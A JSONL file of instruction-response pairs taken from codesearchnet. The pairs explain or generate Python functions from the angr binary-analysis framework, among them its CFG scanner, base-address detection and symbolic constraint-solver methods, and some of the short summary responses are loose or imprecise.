{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef free_chunks(self):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.free_chunks.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "Returns an iterator over all the free chunks in the heap."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef chunk_from_mem(self, ptr):\n        raise NotImplementedError(\"%s not implemented for %s\" % (self.chunk_from_mem.__func__.__name__,\n                                                                 self.__class__.__name__))", "response": "Given a pointer to a user payload return the associated heap chunk."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef successors(self, state, addr=None, jumpkind=None, default_engine=False, procedure_engine=False,\n                   engines=None, **kwargs):\n        \"\"\"\n        Perform execution using any applicable engine. Enumerate the current engines and use the\n        first one that works. Engines are enumerated in order, specified by the ``order`` attribute.\n\n        :param state:               The state to analyze\n        :param addr:                optional, an address to execute at instead of the state's ip\n        :param jumpkind:            optional, the jumpkind of the previous exit\n        :param default_engine:      Whether we should only attempt to use the default engine (usually VEX)\n        :param procedure_engine:    Whether we should only attempt to use the procedure engine\n        :param engines:             A list of engines to try to use, instead of the default.\n                                    This list is expected to contain engine names or engine instances.\n\n        Additional keyword arguments will be passed directly into each engine's process method.\n\n        :return SimSuccessors:      A SimSuccessors object classifying the results of the run.\n        \"\"\"\n        if addr is not None or jumpkind is not None:\n            state = state.copy()\n            if addr is not None:\n                state.ip = addr\n            if jumpkind is not None:\n                state.history.jumpkind = jumpkind\n\n        if default_engine and self.has_default_engine():\n            engines = [self.default_engine]\n        elif procedure_engine and self.has_procedure_engine():\n            engines = [self.procedure_engine]\n        elif engines is None:\n            engines = (self.get_plugin(name) for name in self.order)\n        else:\n            engines = (self.get_plugin(e) if isinstance(e, str) else e for e in engines)\n\n        for engine in engines:\n            if engine.check(state, **kwargs):\n                r = engine.process(state, **kwargs)\n                if r.processed:\n                    return r\n\n        raise AngrExitError(\"All engines failed to execute!\")", "response": "Returns a SimSuccessors object representing the successors of the current state."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _get_next_code_addr(self, initial_state):\n        next_addr = self._get_next_addr_to_search()\n        if next_addr is None:\n            return None\n\n        start_addr = next_addr\n        sz = \"\"\n        is_sz = True\n        while is_sz:\n            # Get data until we meet a 0\n            while next_addr in initial_state.memory:\n                try:\n                    l.debug(\"Searching address %x\", next_addr)\n                    val = initial_state.mem_concrete(next_addr, 1)\n                    if val == 0:\n                        if len(sz) < 4:\n                            is_sz = False\n                        else:\n                            reach_end = True\n                        break\n                    if chr(val) not in string.printable:\n                        is_sz = False\n                        break\n                    sz += chr(val)\n                    next_addr += 1\n                except SimValueError:\n                    # Not concretizable\n                    l.debug(\"Address 0x%08x is not concretizable!\", next_addr)\n                    break\n\n            if len(sz) > 0 and is_sz:\n                l.debug(\"Got a string of %d chars: [%s]\", len(sz), sz)\n                # l.debug(\"Occpuy %x - %x\", start_addr, start_addr + len(sz) + 1)\n                self._seg_list.occupy(start_addr, len(sz) + 1)\n                sz = \"\"\n                next_addr = self._get_next_addr_to_search()\n                if next_addr is None:\n                    return None\n                # l.debug(\"next addr = %x\", next_addr)\n                start_addr = next_addr\n\n            if is_sz:\n                next_addr += 1\n\n        instr_alignment = initial_state.arch.instruction_alignment\n        if start_addr % instr_alignment > 0:\n            start_addr = start_addr - start_addr % instr_alignment + \\\n                instr_alignment\n\n        l.debug('_get_next_code_addr() returns 0x%x', start_addr)\n        return start_addr", "response": "This function searches for the next code address in the memory."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _symbolic_reconnoiter(self, addr, target_addr, max_depth=10):\n        state = self.project.factory.blank_state(addr=addr,\n                                                  mode=\"symbolic\",\n                                                  add_options={o.CALLLESS}\n                                                 )\n        initial_exit = self.project.factory.path(state)\n        explorer = Explorer(self.project,\n                            start=initial_exit,\n                            max_depth=max_depth,\n                            find=(target_addr), num_find=1).run()\n        if len(explorer.found) > 0:\n            path = explorer.found[0]\n            last_run = path.last_run\n            return last_run.flat_exits()\n        else:\n            return []", "response": "This method returns a list of all possible symbolic IRSBs that are at target_addr."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _scan_function_prologues(self, traced_address, function_exits, initial_state):\n\n        # Precompile all regexes\n        regexes = set()\n        for ins_regex in self.project.arch.function_prologs:\n            r = re.compile(ins_regex)\n            regexes.add(r)\n\n        # TODO: Make sure self._start is aligned\n\n        # Construct the binary blob first\n\n        for start_, bytes_ in self.project.loader.main_object.memory.backers():\n            for regex in regexes:\n                # Match them!\n                for mo in regex.finditer(bytes):\n                    position = mo.start() + start_\n                    if position % self.project.arch.instruction_alignment == 0:\n                        if position not in traced_address:\n                            percentage = self._seg_list.occupied_size * 100.0 / (self._valid_memory_region_size)\n                            l.info(\"Scanning %xh, progress %0.04f%%\", position, percentage)\n\n                            self._unassured_functions.add(position)\n\n                            self._scan_code(traced_address, function_exits, initial_state, position)\n                        else:\n                            l.info(\"Skipping %xh\", position)", "response": "Scan the entire program space for prologues and start code scanning at those positions."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nexecute each basic block with an indeterminiable exit target.", "response": "def _process_indirect_jumps(self):\n        \"\"\"\n        Execute each basic block with an indeterminiable exit target\n        :returns:\n        \"\"\"\n\n        function_starts = set()\n        l.info(\"We have %d indirect jumps\", len(self._indirect_jumps))\n\n        for jumpkind, irsb_addr in self._indirect_jumps:\n            # First execute the current IRSB in concrete mode\n\n            if len(function_starts) > 20:\n                break\n\n            if jumpkind == \"Ijk_Call\":\n                state = self.project.factory.blank_state(addr=irsb_addr, mode=\"concrete\",\n                                                    add_options={o.SYMBOLIC_INITIAL_VALUES}\n                                                   )\n                path = self.project.factory.path(state)\n                l.debug(hex(irsb_addr))\n\n                try:\n                    r = (path.next_run.successors + path.next_run.unsat_successors)[0]\n                    ip = r.solver.eval_one(r.ip)\n\n                    function_starts.add(ip)\n                    continue\n                except SimSolverModeError as ex:\n                    pass\n\n                # Not resolved\n                # Do a backward slicing from the call\n                irsb = self.project.factory.block(irsb_addr).vex\n                stmts = irsb.statements\n                # Start slicing from the \"next\"\n\n                b = Blade(self.cfg, irsb.addr, -1, project=self.project)\n\n                # Debugging output\n                for addr, stmt_idx in sorted(list(b.slice.nodes())):\n                    irsb = self.project.factory.block(addr).vex\n                    stmts = irsb.statements\n                    l.debug(\"%x: %d | %s %d\", (addr, stmt_idx), stmts[stmt_idx], b.slice.in_degree((addr, stmt_idx)))\n\n                # Get all sources\n                sources = [n for n in b.slice.nodes() if b.slice.in_degree(n) == 0]\n\n                # Create the annotated CFG\n                annotatedcfg = AnnotatedCFG(self.project, None, target_irsb_addr=irsb_addr, detect_loops=False)\n                annotatedcfg.from_digraph(b.slice)\n\n                for src_irsb, src_stmt_idx in sources:\n                    # Use slicecutor to execute each one, and get the address\n                    # We simply give up if any exception occurs on the way\n\n                    start_state = self.project.factory.blank_state(addr=src_irsb,\n                                                              add_options=\n                                                              {o.DO_RET_EMULATION,\n                                                               o.TRUE_RET_EMULATION_GUARD}\n                                                             )\n\n                    start_path = self.project.factory.path(start_state)\n\n                    # Create the slicecutor\n                    slicecutor = Slicecutor(self.project, annotatedcfg, start=start_path, targets=(irsb_addr,))\n\n                    # Run it!\n                    try:\n                        slicecutor.run()\n                    except KeyError as ex:\n                        # This is because the program slice is incomplete.\n                        # Blade will support more IRExprs and IRStmts\n                        l.debug(\"KeyError occurred due to incomplete program slice.\", exc_info=ex)\n                        continue\n\n                    # Get the jumping targets\n                    for r in slicecutor.reached_targets:\n                        if r.next_run.successors:\n                            target_ip = r.next_run.successors[0].ip\n                            se = r.next_run.successors[0].se\n\n                            if not se.symbolic(target_ip):\n                                concrete_ip = se.eval_one(target_ip)\n                                function_starts.add(concrete_ip)\n                                l.info(\"Found a function address %x\", concrete_ip)\n\n        return function_starts"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsolving for the most possible base address.", "response": "def _solve_forbase_address(self, function_starts, functions):\n        \"\"\"\n        Voting for the most possible base address.\n\n        :param function_starts:\n        :param functions:\n        :returns:\n        \"\"\"\n\n        pseudo_base_addr = self.project.loader.main_object.min_addr\n\n        base_addr_ctr = { }\n\n        for s in function_starts:\n            for f in functions:\n                base_addr = s - f + pseudo_base_addr\n                ctr = 1\n\n                for k in function_starts:\n                    if k - base_addr + pseudo_base_addr in functions:\n                        ctr += 1\n\n                if ctr > 5:\n                    base_addr_ctr[base_addr] = ctr\n\n        if len(base_addr_ctr):\n            base_addr, hits = sorted([(k, v) for k, v in base_addr_ctr.items()], key=lambda x: x[1], reverse=True)[0]\n\n            return base_addr\n        else:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _determinebase_address(self):\n\n        traced_address = set()\n        self.functions = set()\n        self.call_map = networkx.DiGraph()\n        self.cfg = networkx.DiGraph()\n        initial_state = self.project.factory.blank_state(mode=\"fastpath\")\n        initial_options = initial_state.options - { o.TRACK_CONSTRAINTS } - o.refs\n        initial_options |= { o.SUPER_FASTPATH }\n        # initial_options.remove(o.COW_STATES)\n        initial_state.options = initial_options\n        # Sadly, not all calls to functions are explicitly made by call\n        # instruction - they could be a jmp or b, or something else. So we\n        # should record all exits from a single function, and then add\n        # necessary calling edges in our call map during the post-processing\n        # phase.\n        function_exits = defaultdict(set)\n\n        dump_file_prefix = self.project.filename\n\n        if self._pickle_intermediate_results and \\\n                os.path.exists(dump_file_prefix + \"_indirect_jumps.angr\"):\n            l.debug(\"Loading existing intermediate results.\")\n            self._indirect_jumps = pickle.load(open(dump_file_prefix + \"_indirect_jumps.angr\", \"rb\"))\n            self.cfg = pickle.load(open(dump_file_prefix + \"_coercecfg.angr\", \"rb\"))\n            self._unassured_functions = pickle.load(open(dump_file_prefix + \"_unassured_functions.angr\", \"rb\"))\n        else:\n            # Performance boost :-)\n            # Scan for existing function prologues\n            self._scan_function_prologues(traced_address, function_exits, initial_state)\n\n            if self._pickle_intermediate_results:\n                l.debug(\"Dumping intermediate results.\")\n                pickle.dump(self._indirect_jumps, open(dump_file_prefix + \"_indirect_jumps.angr\", \"wb\"), -1)\n                pickle.dump(self.cfg, open(dump_file_prefix + \"_coercecfg.angr\", \"wb\"), -1)\n                pickle.dump(self._unassured_functions, open(dump_file_prefix + \"_unassured_functions.angr\", \"wb\"), -1)\n\n        if len(self._indirect_jumps):\n            # We got some indirect jumps!\n            # Gotta execute each basic block and see where it wants to jump to\n            function_starts = self._process_indirect_jumps()\n\n            self.base_address = self._solve_forbase_address(function_starts, self._unassured_functions)\n\n            l.info(\"Base address should be 0x%x\", self.base_address)\n\n        else:\n            l.debug(\"No indirect jumps are found. We switch to the slowpath mode.\")\n            # TODO: Slowpath mode...\n            while True:\n                next_addr = self._get_next_code_addr(initial_state)\n                percentage = self._seg_list.occupied_size * 100.0 / (self._valid_memory_region_size)\n                l.info(\"Analyzing %xh, progress %0.04f%%\", next_addr, percentage)\n                if next_addr is None:\n                    break\n\n                self.call_map.add_node(next_addr)\n\n                self._scan_code(traced_address, function_exits, initial_state, next_addr)\n\n        # Post-processing: Map those calls that are not made by call/blr\n        # instructions to their targets in our map\n        for src, s in function_exits.items():\n            if src in self.call_map:\n                for target in s:\n                    if target in self.call_map:\n                        self.call_map.add_edge(src, target)\n\n        nodes = sorted(self.call_map.nodes())\n        for i in range(len(nodes) - 1):\n            if nodes[i] >= nodes[i + 1] - 4:\n                for dst in self.call_map.successors(nodes[i + 1]):\n                    self.call_map.add_edge(nodes[i], dst)\n                for src in self.call_map.predecessors(nodes[i + 1]):\n                    self.call_map.add_edge(src, nodes[i])\n                self.call_map.remove_node(nodes[i + 1])\n\n        l.debug(\"Construction finished.\")", "response": "Determine the base address of the function that we are going to be called."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nperform a full code scan on the target binary.", "response": "def _full_code_scan(self):\n        \"\"\"\n        Perform a full code scan on the target binary.\n        \"\"\"\n\n        # We gotta time this function\n        start_time = datetime.now()\n\n        traced_address = set()\n        self.functions = set()\n        self.call_map = networkx.DiGraph()\n        self.cfg = networkx.DiGraph()\n        initial_state = self.project.factory.blank_state(mode=\"fastpath\")\n        initial_options = initial_state.options - {o.TRACK_CONSTRAINTS} - o.refs\n        initial_options |= {o.SUPER_FASTPATH}\n        # initial_options.remove(o.COW_STATES)\n        initial_state.options = initial_options\n        # Sadly, not all calls to functions are explicitly made by call\n        # instruction - they could be a jmp or b, or something else. So we\n        # should record all exits from a single function, and then add\n        # necessary calling edges in our call map during the post-processing\n        # phase.\n        function_exits = defaultdict(set)\n\n        widgets = [progressbar.Percentage(),\n                   ' ',\n                   progressbar.Bar(marker=progressbar.RotatingMarker()),\n                   ' ',\n                   progressbar.Timer(),\n                   ' ',\n                   progressbar.ETA()\n        ]\n\n        pb = progressbar.ProgressBar(widgets=widgets, maxval=10000 * 100).start()\n\n        while True:\n            next_addr = self._get_next_code_addr(initial_state)\n            percentage = self._seg_list.occupied_size * 100.0 / (self._valid_memory_region_size)\n            if percentage > 100.0: percentage = 100.0\n            pb.update(percentage * 10000)\n\n            if next_addr is not None:\n                l.info(\"Analyzing %xh, progress %0.04f%%\", next_addr, percentage)\n            else:\n                l.info('No more addr to analyze. Progress %0.04f%%', percentage)\n                break\n\n            self.call_map.add_node(next_addr)\n\n            self._scan_code(traced_address, function_exits, initial_state, next_addr)\n\n        pb.finish()\n        end_time = datetime.now()\n        l.info(\"A full code scan takes %d seconds.\", (end_time - start_time).seconds)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef genenare_callmap_sif(self, filepath):\n        graph = self.call_map\n\n        if graph is None:\n            raise AngrGirlScoutError('Please generate the call graph first.')\n\n        f = open(filepath, \"wb\")\n\n        for src, dst in graph.edges():\n            f.write(\"0x%x\\tDirectEdge\\t0x%x\\n\" % (src, dst))\n\n        f.close()", "response": "Generate a sif file from the call map."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate a list of all recovered basic blocks.", "response": "def generate_code_cover(self):\n        \"\"\"\n        Generate a list of all recovered basic blocks.\n        \"\"\"\n\n        lst = [ ]\n        for irsb_addr in self.cfg.nodes():\n            if irsb_addr not in self._block_size:\n                continue\n            irsb_size = self._block_size[irsb_addr]\n            lst.append((irsb_addr, irsb_size))\n\n        lst = sorted(lst, key=lambda x: x[0])\n\n        return lst"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef reload_solver(self, constraints=None):\n\n        if constraints is None:\n            constraints = self._solver.constraints\n        self._stored_solver = None\n        self._solver.add(constraints)", "response": "Reloads the solver. Useful when changing solver options."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_variables(self, *keys):\n        for k, v in self.eternal_tracked_variables.items():\n            if len(k) >= len(keys) and all(x == y for x, y in zip(keys, k)):\n                yield k, v\n        for k, v in self.temporal_tracked_variables.items():\n            if k[-1] is None:\n                continue\n            if len(k) >= len(keys) and all(x == y for x, y in zip(keys, k)):\n                yield k, v", "response": "Iterate over all variables for which their tracking key is a prefix of the values provided."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nregister a value with the variable tracking system.", "response": "def register_variable(self, v, key, eternal=True):\n        \"\"\"\n        Register a value with the variable tracking system\n\n        :param v:       The BVS to register\n        :param key:     A tuple to register the variable under\n        :parma eternal: Whether this is an eternal variable, default True. If False, an incrementing counter will be\n                        appended to the key.\n        \"\"\"\n        if type(key) is not tuple:\n            raise TypeError(\"Variable tracking key must be a tuple\")\n        if eternal:\n            self.eternal_tracked_variables[key] = v\n        else:\n            self.temporal_tracked_variables = dict(self.temporal_tracked_variables)\n            ctrkey = key + (None,)\n            ctrval = self.temporal_tracked_variables.get(ctrkey, 0) + 1\n            self.temporal_tracked_variables[ctrkey] = ctrval\n            tempkey = key + (ctrval,)\n            self.temporal_tracked_variables[tempkey] = v"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngive an AST iterate over all the keys of all the BVS leaves in the tree which are registered.", "response": "def describe_variables(self, v):\n        \"\"\"\n        Given an AST, iterate over all the keys of all the BVS leaves in the tree which are registered.\n        \"\"\"\n        reverse_mapping = {next(iter(var.variables)): k for k, var in self.eternal_tracked_variables.items()}\n        reverse_mapping.update({next(iter(var.variables)): k for k, var in self.temporal_tracked_variables.items() if k[-1] is not None})\n\n        for var in v.variables:\n            if var in reverse_mapping:\n                yield reverse_mapping[var]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _solver(self):\n        if self._stored_solver is not None:\n            return self._stored_solver\n\n        track = o.CONSTRAINT_TRACKING_IN_SOLVER in self.state.options\n        approximate_first = o.APPROXIMATE_FIRST in self.state.options\n\n        if o.STRINGS_ANALYSIS in self.state.options:\n            if 'smtlib_cvc4' in backend_manager.backends._backends_by_name:\n                our_backend = backend_manager.backends.smtlib_cvc4\n            elif 'smtlib_z3' in backend_manager.backends._backends_by_name:\n                our_backend = backend_manager.backends.smtlib_z3\n            elif 'smtlib_abc' in backend_manager.backends._backends_by_name:\n                our_backend = backend_manager.backends.smtlib_abc\n            else:\n                raise ValueError(\"Could not find suitable string solver!\")\n            if o.COMPOSITE_SOLVER in self.state.options:\n                self._stored_solver = claripy.SolverComposite(\n                    template_solver_string=claripy.SolverCompositeChild(backend=our_backend, track=track)\n                )\n        elif o.ABSTRACT_SOLVER in self.state.options:\n            self._stored_solver = claripy.SolverVSA()\n        elif o.SYMBOLIC in self.state.options and o.REPLACEMENT_SOLVER in self.state.options:\n            self._stored_solver = claripy.SolverReplacement(auto_replace=False)\n        elif o.SYMBOLIC in self.state.options and o.CACHELESS_SOLVER in self.state.options:\n            self._stored_solver = claripy.SolverCacheless(track=track)\n        elif o.SYMBOLIC in self.state.options and o.COMPOSITE_SOLVER in self.state.options:\n            self._stored_solver = claripy.SolverComposite(track=track)\n        elif o.SYMBOLIC in self.state.options and any(opt in self.state.options for opt in o.approximation):\n            self._stored_solver = claripy.SolverHybrid(track=track, approximate_first=approximate_first)\n        elif o.HYBRID_SOLVER in self.state.options:\n            self._stored_solver = claripy.SolverHybrid(track=track, approximate_first=approximate_first)\n        elif o.SYMBOLIC in self.state.options:\n            self._stored_solver = claripy.Solver(track=track)\n        else:\n            self._stored_solver = claripy.SolverConcrete()\n\n        return self._stored_solver", "response": "Creates or gets a Claripy solver based on the state options."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating an unconstrained BV with the specified name and size.", "response": "def Unconstrained(self, name, bits, uninitialized=True, inspect=True, events=True, key=None, eternal=False, **kwargs):\n        \"\"\"\n        Creates an unconstrained symbol or a default concrete value (0), based on the state options.\n\n        :param name:            The name of the symbol.\n        :param bits:            The size (in bits) of the symbol.\n        :param uninitialized:   Whether this value should be counted as an \"uninitialized\" value in the course of an\n                                analysis.\n        :param inspect:         Set to False to avoid firing SimInspect breakpoints\n        :param events:          Set to False to avoid generating a SimEvent for the occasion\n        :param key:             Set this to a tuple of increasingly specific identifiers (for example,\n                                ``('mem', 0xffbeff00)`` or ``('file', 4, 0x20)`` to cause it to be tracked, i.e.\n                                accessable through ``solver.get_variables``.\n        :param eternal:         Set to True in conjunction with setting a key to cause all states with the same\n                                ancestry to retrieve the same symbol when trying to create the value. If False, a\n                                counter will be appended to the key.\n\n        :returns:               an unconstrained symbol (or a concrete value of 0).\n        \"\"\"\n        if o.SYMBOLIC_INITIAL_VALUES in self.state.options:\n            # Return a symbolic value\n            if o.ABSTRACT_MEMORY in self.state.options:\n                l.debug(\"Creating new top StridedInterval\")\n                r = claripy.TSI(bits=bits, name=name, uninitialized=uninitialized, **kwargs)\n            else:\n                l.debug(\"Creating new unconstrained BV named %s\", name)\n                if o.UNDER_CONSTRAINED_SYMEXEC in self.state.options:\n                    r = self.BVS(name, bits, uninitialized=uninitialized, key=key, eternal=eternal, inspect=inspect, events=events, **kwargs)\n                else:\n                    r = self.BVS(name, bits, uninitialized=uninitialized, key=key, eternal=eternal, inspect=inspect, events=events, **kwargs)\n\n            return r\n        else:\n            # Return a default value, aka. 0\n            return claripy.BVV(0, bits)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a bit - vector symbol.", "response": "def BVS(self, name, size,\n            min=None, max=None, stride=None,\n            uninitialized=False,\n            explicit_name=None, key=None, eternal=False,\n            inspect=True, events=True,\n            **kwargs): #pylint:disable=redefined-builtin\n        \"\"\"\n        Creates a bit-vector symbol (i.e., a variable). Other keyword parameters are passed directly on to the\n        constructor of claripy.ast.BV.\n\n        :param name:            The name of the symbol.\n        :param size:            The size (in bits) of the bit-vector.\n        :param min:             The minimum value of the symbol. Note that this **only** work when using VSA.\n        :param max:             The maximum value of the symbol. Note that this **only** work when using VSA.\n        :param stride:          The stride of the symbol. Note that this **only** work when using VSA.\n        :param uninitialized:   Whether this value should be counted as an \"uninitialized\" value in the course of an\n                                analysis.\n        :param explicit_name:   Set to True to prevent an identifier from appended to the name to ensure uniqueness.\n        :param key:             Set this to a tuple of increasingly specific identifiers (for example,\n                                ``('mem', 0xffbeff00)`` or ``('file', 4, 0x20)`` to cause it to be tracked, i.e.\n                                accessable through ``solver.get_variables``.\n        :param eternal:         Set to True in conjunction with setting a key to cause all states with the same\n                                ancestry to retrieve the same symbol when trying to create the value. If False, a\n                                counter will be appended to the key.\n        :param inspect:         Set to False to avoid firing SimInspect breakpoints\n        :param events:          Set to False to avoid generating a SimEvent for the occasion\n\n        :return:                A BV object representing this symbol.\n        \"\"\"\n\n        # should this be locked for multithreading?\n        if key is not None and eternal and key in self.eternal_tracked_variables:\n            r = self.eternal_tracked_variables[key]\n            # pylint: disable=too-many-boolean-expressions\n            if size != r.length or min != r.args[1] or max != r.args[2] or stride != r.args[3] or uninitialized != r.args[4] or bool(explicit_name) ^ (r.args[0] == name):\n                l.warning(\"Variable %s being retrieved with differnt settings than it was tracked with\", name)\n        else:\n            r = claripy.BVS(name, size, min=min, max=max, stride=stride, uninitialized=uninitialized, explicit_name=explicit_name, **kwargs)\n            if key is not None:\n                self.register_variable(r, key, eternal)\n\n        if inspect:\n            self.state._inspect('symbolic_variable', BP_AFTER, symbolic_name=next(iter(r.variables)), symbolic_size=size, symbolic_expr=r)\n        if events:\n            self.state.history.add_event('unconstrained', name=next(iter(r.variables)), bits=size, **kwargs)\n        if o.TRACK_SOLVER_VARIABLES in self.state.options:\n            self.all_variables = list(self.all_variables)\n            self.all_variables.append(r)\n        return r"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef eval_to_ast(self, e, n, extra_constraints=(), exact=None):\n        return self._solver.eval_to_ast(e, n, extra_constraints=self._adjust_constraint_list(extra_constraints), exact=exact)", "response": "Evaluate an expression using the solver if necessary. Returns an AST object."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _eval(self, e, n, extra_constraints=(), exact=None):\n        return self._solver.eval(e, n, extra_constraints=self._adjust_constraint_list(extra_constraints), exact=exact)", "response": "Evaluate an expression using the solver if necessary. Returns a tuple of the solutions that are approximate."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the maximum value of expression e.", "response": "def max(self, e, extra_constraints=(), exact=None):\n        \"\"\"\n        Return the maximum value of expression `e`.\n\n        :param e                : expression (an AST) to evaluate\n        :param extra_constraints: extra constraints (as ASTs) to add to the solver for this solve\n        :param exact            : if False, return approximate solutions.\n        :return: the maximum possible value of e (backend object)\n        \"\"\"\n        if exact is False and o.VALIDATE_APPROXIMATIONS in self.state.options:\n            ar = self._solver.max(e, extra_constraints=self._adjust_constraint_list(extra_constraints), exact=False)\n            er = self._solver.max(e, extra_constraints=self._adjust_constraint_list(extra_constraints))\n            assert er <= ar\n            return ar\n        return self._solver.max(e, extra_constraints=self._adjust_constraint_list(extra_constraints), exact=exact)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns True if v is a solution of expr False otherwise.", "response": "def solution(self, e, v, extra_constraints=(), exact=None):\n        \"\"\"\n        Return True if `v` is a solution of `expr` with the extra constraints, False otherwise.\n\n        :param e:                   An expression (an AST) to evaluate\n        :param v:                   The proposed solution (an AST)\n        :param extra_constraints:   Extra constraints (as ASTs) to add to the solver for this solve.\n        :param exact:               If False, return approximate solutions.\n        :return:                    True if `v` is a solution of `expr`, False otherwise\n        \"\"\"\n        if exact is False and o.VALIDATE_APPROXIMATIONS in self.state.options:\n            ar = self._solver.solution(e, v, extra_constraints=self._adjust_constraint_list(extra_constraints), exact=False)\n            er = self._solver.solution(e, v, extra_constraints=self._adjust_constraint_list(extra_constraints))\n            if er is True:\n                assert ar is True\n            return ar\n        return self._solver.solution(e, v, extra_constraints=self._adjust_constraint_list(extra_constraints), exact=exact)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef unsat_core(self, extra_constraints=()):\n        if o.CONSTRAINT_TRACKING_IN_SOLVER not in self.state.options:\n            raise SimSolverOptionError('CONSTRAINT_TRACKING_IN_SOLVER must be enabled before calling unsat_core().')\n        return self._solver.unsat_core(extra_constraints=extra_constraints)", "response": "This function returns the unsatisfiable version of the current core."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef satisfiable(self, extra_constraints=(), exact=None):\n        if exact is False and o.VALIDATE_APPROXIMATIONS in self.state.options:\n            er = self._solver.satisfiable(extra_constraints=self._adjust_constraint_list(extra_constraints))\n            ar = self._solver.satisfiable(extra_constraints=self._adjust_constraint_list(extra_constraints), exact=False)\n            if er is True:\n                assert ar is True\n            return ar\n        return self._solver.satisfiable(extra_constraints=self._adjust_constraint_list(extra_constraints), exact=exact)", "response": "This function checks if the solver is in a sat state."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef add(self, *constraints):\n        cc = self._adjust_constraint_list(constraints)\n        return self._solver.add(cc)", "response": "Adds some constraints to the solver."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncasts a solution for the given expression to type cast_to.", "response": "def _cast_to(e, solution, cast_to):\n        \"\"\"\n        Casts a solution for the given expression to type `cast_to`.\n\n        :param e: The expression `value` is a solution for\n        :param value: The solution to be cast\n        :param cast_to: The type `value` should be cast to. Must be one of the currently supported types (bytes|int)\n        :raise ValueError: If cast_to is a currently unsupported cast target.\n        :return: The value of `solution` cast to type `cast_to`\n        \"\"\"\n        if cast_to is None:\n            return solution\n\n        if type(solution) is bool:\n            if cast_to is bytes:\n                return bytes([int(solution)])\n            elif cast_to is int:\n                return int(solution)\n        elif type(solution) is float:\n            solution = _concrete_value(claripy.FPV(solution, claripy.fp.FSort.from_size(len(e))).raw_to_bv())\n\n        if cast_to is bytes:\n            if len(e) == 0:\n                return b\"\"\n            return binascii.unhexlify('{:x}'.format(solution).zfill(len(e)//4))\n\n        if cast_to is not int:\n            raise ValueError(\"cast_to parameter {!r} is not a valid cast target, currently supported are only int and bytes!\".format(cast_to))\n\n        return solution"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef eval_upto(self, e, n, cast_to=None, **kwargs):\n        concrete_val = _concrete_value(e)\n        if concrete_val is not None:\n            return [self._cast_to(e, concrete_val, cast_to)]\n\n        cast_vals = [self._cast_to(e, v, cast_to) for v in self._eval(e, n, **kwargs)]\n        if len(cast_vals) == 0:\n            raise SimUnsatError('Not satisfiable: %s, expected up to %d solutions' % (e.shallow_repr(), n))\n        return cast_vals", "response": "Evaluate an expression and return a list of possible values."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef eval_one(self, e, **kwargs):\n        try:\n            return self.eval_exact(e, 1, **{k: v for (k, v) in kwargs.items() if k != 'default'})[0]\n        except (SimUnsatError, SimValueError, SimSolverModeError):\n            if 'default' in kwargs:\n                return kwargs.pop('default')\n            raise", "response": "Evaluate an expression to get the only possible solution. Errors if either no or more than one solution is returned."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef eval_atmost(self, e, n, **kwargs):\n        r = self.eval_upto(e, n+1, **kwargs)\n        if len(r) > n:\n            raise SimValueError(\"Concretized %d values (must be at most %d) in eval_atmost\" % (len(r), n))\n        return r", "response": "Evaluate an expression to get at most n possible solutions. Errors if either none or more than n solutions are returned."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn True if the expression e has only one solution by querying the constraint solver. It does also add that unique solution to the constraints.", "response": "def unique(self, e, **kwargs):\n        \"\"\"\n        Returns True if the expression `e` has only one solution by querying\n        the constraint solver. It does also add that unique solution to the\n        solver's constraints.\n        \"\"\"\n        if not isinstance(e, claripy.ast.Base):\n            return True\n\n        # if we don't want to do symbolic checks, assume symbolic variables are multivalued\n        if o.SYMBOLIC not in self.state.options and self.symbolic(e):\n            return False\n\n        r = self.eval_upto(e, 2, **kwargs)\n        if len(r) == 1:\n            self.add(e == r[0])\n            return True\n        elif len(r) == 0:\n            raise SimValueError(\"unsatness during uniqueness check(ness)\")\n        else:\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef symbolic(self, e): # pylint:disable=R0201\n        if type(e) in (int, bytes, float, bool):\n            return False\n        return e.symbolic", "response": "Returns True if the expression e is symbolic."}
